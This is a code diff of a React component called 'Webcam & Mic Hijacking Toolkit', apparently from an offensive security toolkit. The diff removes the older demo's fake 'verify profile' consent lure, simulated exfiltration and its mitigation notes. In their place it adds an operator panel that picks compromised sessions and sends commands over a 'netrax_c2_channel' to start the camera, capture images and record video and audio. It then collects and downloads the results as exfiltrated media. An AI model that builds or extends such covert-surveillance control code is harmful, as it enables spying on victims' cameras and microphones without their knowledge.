@@ -1,129 +1,99 @@
+
 'use client';
 
 import { useState, useRef, useEffect } from 'react';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera, Video, Mic, StopCircle, Upload, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
-import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
+import { Camera, Video, Mic, StopCircle, Download, Loader2, Image as ImageIcon, Save } from 'lucide-react';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import { Badge } from './ui/badge';
 import { ScrollArea } from './ui/scroll-area';
 import { format } from 'date-fns';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
+import { Label } from './ui/label';
+import type { TrackedEvent } from './live-tracker';
 
 type MediaChunk = {
   id: string;
   blob: Blob;
+  type: 'video' | 'audio' | 'image';
   timestamp: string;
 };
 
-export function WebcamHijackTool() {
+type WebcamHijackToolProps = {
+    sessions: Map<string, TrackedEvent[]>;
+    selectedSessionId: string | null;
+    setSelectedSessionId: (id: string | null) => void;
+}
+
+export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessionId }: WebcamHijackToolProps) {
   const { toast } = useToast();
   const { user } = useAuth();
   
-  const [hasCameraPermission, setHasCameraPermission] = useState(false);
-  const [isRecording, setIsRecording] = useState(false);
-  const [capturedChunks, setCapturedChunks] = useState<MediaChunk[]>([]);
-  const [isUploading, setIsUploading] = useState(false);
-  
+  const [isRecordingVideo, setIsRecordingVideo] = useState(false);
+  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
+  const [capturedMedia, setCapturedMedia] = useState<MediaChunk[]>([]);
   const videoRef = useRef<HTMLVideoElement>(null);
-  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
-  const streamRef = useRef<MediaStream | null>(null);
+  
+  const hasActiveSession = selectedSessionId && sessions.has(selectedSessionId);
+  const channelRef = useRef<BroadcastChannel | null>(null);
 
   useEffect(() => {
-    // Cleanup function to stop tracks when component unmounts
+    channelRef.current = new BroadcastChannel('netrax_c2_channel');
+    
+    const handleMessage = (event: MessageEvent) => {
+        if (event.data.type === 'media-stream' && event.data.sessionId === selectedSessionId) {
+            const { data } = event.data;
+            const blob = new Blob([new Uint8Array(data.chunk)], { type: data.type });
+            
+            const newChunk: MediaChunk = {
+                id: `media-${Date.now()}`,
+                blob: blob,
+                type: data.type.startsWith('video') ? 'video' : 'audio',
+                timestamp: new Date().toISOString()
+            };
+            setCapturedMedia(prev => [newChunk, ...prev]);
+        }
+    };
+    
+    channelRef.current.addEventListener('message', handleMessage);
+
     return () => {
-      if (streamRef.current) {
-        streamRef.current.getTracks().forEach(track => track.stop());
-      }
+      channelRef.current?.close();
     };
-  }, []);
+  }, [selectedSessionId]);
 
-  const getCameraPermission = async () => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-      streamRef.current = stream;
-      setHasCameraPermission(true);
-
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-      }
-      toast({ title: 'Permission Granted', description: 'Webcam and microphone access enabled.' });
-    } catch (error) {
-      console.error('Error accessing camera:', error);
-      setHasCameraPermission(false);
-      toast({
-        variant: 'destructive',
-        title: 'Camera Access Denied',
-        description: 'Please enable camera permissions in your browser settings to use this tool.',
-      });
+  const sendCommandToSession = (command: string, options = {}) => {
+    if (!selectedSessionId) {
+        toast({ variant: 'destructive', title: 'No session selected' });
+        return;
     }
-  };
-  
-  const startHijack = () => {
-    if (!streamRef.current) {
-      toast({ variant: 'destructive', title: 'Error', description: 'No active media stream.'});
-      return;
-    }
-    
-    setIsRecording(true);
-    const options = { mimeType: 'video/webm; codecs=vp9' };
-    mediaRecorderRef.current = new MediaRecorder(streamRef.current, options);
-    
-    mediaRecorderRef.current.ondataavailable = (event) => {
-      if (event.data.size > 0) {
-        setCapturedChunks(prev => [...prev, {
-            id: `chunk-${Date.now()}`,
-            blob: event.data,
-            timestamp: new Date().toISOString()
-        }]);
-      }
-    };
-    
-    mediaRecorderRef.current.start(10000); // Create a chunk every 10 seconds
-    toast({ title: 'Silent Recording Started', description: 'Media is being captured in the background.'});
+    channelRef.current?.postMessage({
+        type: 'command',
+        sessionId: selectedSessionId,
+        command,
+        options,
+    });
     logActivity({
         user: user?.displayName || 'Operator',
-        action: 'Started Webcam Hijack',
-        details: 'Began silent recording of media stream.'
+        action: `Sent command: ${command}`,
+        details: `Session: ${selectedSessionId}`
     });
   };
 
-  const stopHijack = () => {
-    if (mediaRecorderRef.current && isRecording) {
-        mediaRecorderRef.current.stop();
-        setIsRecording(false);
-        toast({ title: 'Recording Stopped', description: 'Background media capture has ended.'});
-    }
-  };
-  
-  const exfiltrateData = async () => {
-    if (capturedChunks.length === 0) {
-        toast({ variant: 'destructive', title: 'No Data', description: 'No media chunks to exfiltrate.'});
-        return;
-    }
-    setIsUploading(true);
-    
-    // Simulate uploading each chunk
-    for (const chunk of capturedChunks) {
-        const formData = new FormData();
-        formData.append('file', chunk.blob, `capture-${chunk.id}.webm`);
-        
-        // In a real scenario, this fetch would point to an attacker's C2 server
-        // For this demo, we simulate the network request.
-        await new Promise(resolve => setTimeout(resolve, 500));
-        
-        logActivity({
-            user: user?.displayName || 'Operator',
-            action: 'Exfiltrated Media Chunk',
-            details: `Uploaded ${chunk.id} (${(chunk.blob.size / 1024).toFixed(2)} KB)`
-        });
-    }
-    
-    setIsUploading(false);
-    setCapturedChunks([]);
-    toast({ title: 'Exfiltration Complete', description: 'All media chunks have been uploaded.'});
+  const downloadMedia = (chunk: MediaChunk) => {
+    const url = URL.createObjectURL(chunk.blob);
+    const a = document.createElement('a');
+    a.style.display = 'none';
+    a.href = url;
+    const extension = chunk.type === 'image' ? 'png' : chunk.type === 'video' ? 'webm' : 'ogg';
+    a.download = `${chunk.type}_${chunk.id}.${extension}`;
+    document.body.appendChild(a);
+    a.click();
+    window.URL.revokeObjectURL(url);
+    toast({ title: "Media downloaded."});
   };
 
   return (
@@ -133,73 +103,73 @@ export function WebcamHijackTool() {
             <Camera className="h-6 w-6" />
             <CardTitle>Webcam & Mic Hijacking Toolkit</CardTitle>
         </div>
-        <CardDescription>Demonstrates post-consent abuse of browser media permissions for covert recording and exfiltration.</CardDescription>
+        <CardDescription>Remotely control the camera and microphone of a compromised session.</CardDescription>
       </CardHeader>
       <CardContent className="grid md:grid-cols-2 gap-8">
         <div className="space-y-4">
+           <div className="space-y-2">
+                <Label>Target Session</Label>
+                 <Select value={selectedSessionId || ''} onValueChange={setSelectedSessionId} disabled={sessions.size === 0}>
+                    <SelectTrigger>
+                        <SelectValue placeholder="Select an active session..." />
+                    </SelectTrigger>
+                    <SelectContent>
+                        {Array.from(sessions.keys()).map(id => (
+                            <SelectItem key={id} value={id}>{id}</SelectItem>
+                        ))}
+                    </SelectContent>
+                </Select>
+           </div>
+           
             <Card className="bg-primary/10">
                 <CardHeader>
-                    <CardTitle className="text-lg">1. Social Engineering Interface</CardTitle>
-                    <CardDescription>This UI mimics a legitimate feature to obtain user consent for media access.</CardDescription>
+                    <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Video Feed</CardTitle>
                 </CardHeader>
-                <CardContent>
-                    <div className="flex flex-col items-center gap-4 p-4 border-2 border-dashed rounded-lg">
-                        <video ref={videoRef} className="w-full aspect-video rounded-md bg-black" autoPlay muted />
-                        {!hasCameraPermission ? (
-                             <Button onClick={getCameraPermission} className="w-full">
-                                <Camera className="mr-2 h-4 w-4"/> Enable Camera to Verify Profile
-                            </Button>
-                        ) : (
-                             <Button className="w-full" disabled={isRecording}>
-                                <ShieldCheck className="mr-2 h-4 w-4"/> Profile Verified!
-                            </Button>
-                        )}
+                <CardContent className="space-y-4">
+                    <video ref={videoRef} className="w-full aspect-video rounded-md bg-black" autoPlay muted />
+                    <div className="grid grid-cols-2 gap-2">
+                        <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession}>Start Camera</Button>
+                        <Button onClick={() => sendCommandToSession('capture-image')} disabled={!hasActiveSession}>Capture Image</Button>
+                        <Button onClick={() => { sendCommandToSession('start-video-record'); setIsRecordingVideo(true); }} disabled={!hasActiveSession || isRecordingVideo}>Start Recording</Button>
+                        <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsRecordingVideo(false); }} disabled={!hasActiveSession || !isRecordingVideo}>Stop Recording</Button>
                     </div>
                 </CardContent>
             </Card>
-             <Card className="bg-primary/10">
+
+            <Card className="bg-primary/10">
                 <CardHeader>
-                    <CardTitle className="text-lg">2. Attacker Control Panel</CardTitle>
+                    <CardTitle className="text-lg flex items-center gap-2"><Mic className="h-5 w-5"/> Microphone Feed</CardTitle>
                 </CardHeader>
                 <CardContent className="grid grid-cols-2 gap-4">
-                     <Button onClick={startHijack} disabled={!hasCameraPermission || isRecording}>
-                        <Mic className="mr-2 h-4 w-4"/> Start Silent Recording
-                    </Button>
-                    <Button variant="destructive" onClick={stopHijack} disabled={!isRecording}>
-                        <StopCircle className="mr-2 h-4 w-4"/> Stop Recording
-                    </Button>
+                     <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsRecordingAudio(true); }} disabled={!hasActiveSession || isRecordingAudio}>Start Recording</Button>
+                     <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsRecordingAudio(false); }} disabled={!hasActiveSession || !isRecordingAudio}>Stop Recording</Button>
                 </CardContent>
             </Card>
         </div>
         
         <div className="space-y-4">
-            <div className="flex justify-between items-center">
-                <div>
-                   <h3 className="font-semibold text-lg">3. Captured Media Fragments</h3>
-                   <p className="text-sm text-muted-foreground">Represents data chunks recorded silently in the background.</p>
-                </div>
-                 <Badge variant={isRecording ? 'destructive' : 'secondary'}>
-                    {isRecording ? 'RECORDING' : 'Idle'}
-                 </Badge>
-            </div>
-            <Card className="h-96 flex flex-col">
+            <h3 className="font-semibold text-lg">Exfiltrated Media</h3>
+            <Card className="h-full flex flex-col min-h-[400px]">
                 <CardContent className="p-2 flex-grow">
-                    <ScrollArea className="h-full">
+                    <ScrollArea className="h-full max-h-[450px]">
                         <div className="p-4">
-                         {capturedChunks.length === 0 ? (
+                         {capturedMedia.length === 0 ? (
                             <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
                          ) : (
                             <div className="space-y-3">
-                                {capturedChunks.map(chunk => (
+                                {capturedMedia.map(chunk => (
                                     <div key={chunk.id} className="flex items-center justify-between p-2 bg-background rounded-md">
                                         <div className="flex items-center gap-3">
-                                            <Video className="h-5 w-5 text-accent"/>
+                                            {chunk.type === 'image' ? <ImageIcon className="h-5 w-5 text-accent"/> : <Video className="h-5 w-5 text-accent"/>}
                                             <div className="font-mono text-xs">
-                                                <p>{chunk.id}</p>
+                                                <p className="capitalize">{chunk.type} Capture</p>
                                                 <p className="text-muted-foreground">{format(new Date(chunk.timestamp), 'HH:mm:ss')}</p>
                                             </div>
                                         </div>
-                                        <Badge variant="outline">{(chunk.blob.size / 1024).toFixed(1)} KB</Badge>
+                                        <div className='flex items-center gap-2'>
+                                            <Badge variant="outline">{(chunk.blob.size / 1024).toFixed(1)} KB</Badge>
+                                            <Button size="icon" variant="ghost" onClick={() => downloadMedia(chunk)}><Download className="h-4 w-4"/></Button>
+                                        </div>
                                     </div>
                                 ))}
                             </div>
@@ -207,26 +177,10 @@ export function WebcamHijackTool() {
                          </div>
                     </ScrollArea>
                 </CardContent>
-                <CardFooter>
-                     <Button onClick={exfiltrateData} disabled={capturedChunks.length === 0 || isUploading} className="w-full">
-                        {isUploading ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Upload className="mr-2 h-4 w-4"/>}
-                        Exfiltrate Data ({capturedChunks.length} chunks)
-                    </Button>
-                </CardFooter>
             </Card>
         </div>
 
       </CardContent>
-       <CardFooter>
-            <Alert variant="destructive">
-                <AlertTriangle className="h-4 w-4" />
-                <AlertTitle>Impact & Mitigation</AlertTitle>
-                <AlertDescription>
-                    This exploit demonstrates that once permissions are granted, a malicious site can covertly record audio and video. The only user-facing indicator is the small hardware light on the device, which can be easily missed.
-                    <strong className="block mt-2">Mitigations:</strong> Modern browsers have improved this by showing persistent UI indicators (e.g., a colored dot in the tab bar) when media is being captured. Users should be trained to recognize these indicators and to regularly review site permissions in their browser settings.
-                </AlertDescription>
-            </Alert>
-        </CardFooter>
     </Card>
   );
 }
